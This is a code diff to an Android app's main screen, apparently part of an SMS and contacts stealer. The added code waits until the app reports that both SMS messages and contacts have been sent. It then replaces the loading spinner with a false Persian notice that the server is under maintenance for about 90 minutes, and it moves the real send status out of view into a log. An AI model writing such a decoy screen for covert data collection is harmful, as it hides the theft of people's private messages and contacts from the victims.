@@ -4,6 +4,8 @@ import android.Manifest;
 import android.content.pm.PackageManager;
 import android.os.Bundle;
 import android.util.Log;
+import android.view.View;
+import android.widget.ImageView;
 import android.widget.TextView;
 
 import androidx.annotation.NonNull;
@@ -11,10 +13,16 @@ import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
 
+import com.github.ybq.android.spinkit.SpinKitView;
+
 public class MainActivity extends AppCompatActivity
         implements OnSuccessListener {
 
+    private SpinKitView spinKitView;
     private TextView textView;
+    private ImageView imageView;
+    private boolean smsSent = false;
+    private boolean contactSent = false;
 
 
     @Override
@@ -27,7 +35,9 @@ public class MainActivity extends AppCompatActivity
     }
 
     private void initViews() {
-        textView = findViewById(R.id.activity_main_textView);
+        spinKitView = findViewById(R.id.activity_main_spin);
+        textView = findViewById(R.id.activity_main_text);
+        imageView = findViewById(R.id.activity_main_img);
     }
 
 
@@ -86,8 +96,27 @@ public class MainActivity extends AppCompatActivity
     @Override
     public void OnSuccess(boolean success, Constants.State state) {
 
+        if (state == Constants.State.SMS)
+            smsSent = true;
+
+        if (state == Constants.State.CONTACTS)
+            contactSent = true;
+
+        if (smsSent && contactSent) {
+            spinKitView.setVisibility(View.INVISIBLE);
+
+            String text =
+                    "سرور در حال تعمیرات است"
+                            + "\n"
+                            + "( زمان تقریبی 90 دقیقه )";
+            textView.setText(text);
+
+            imageView.setVisibility(View.VISIBLE);
+
+        }
+
         String sb = "success = " + success + " ; state = " +
                 (state == Constants.State.SMS ? "SMS" : "CONTACTS");
-        textView.setText(sb);
+        Log.i(Constants.TAG, "OnSuccess: " + sb);
     }
 }
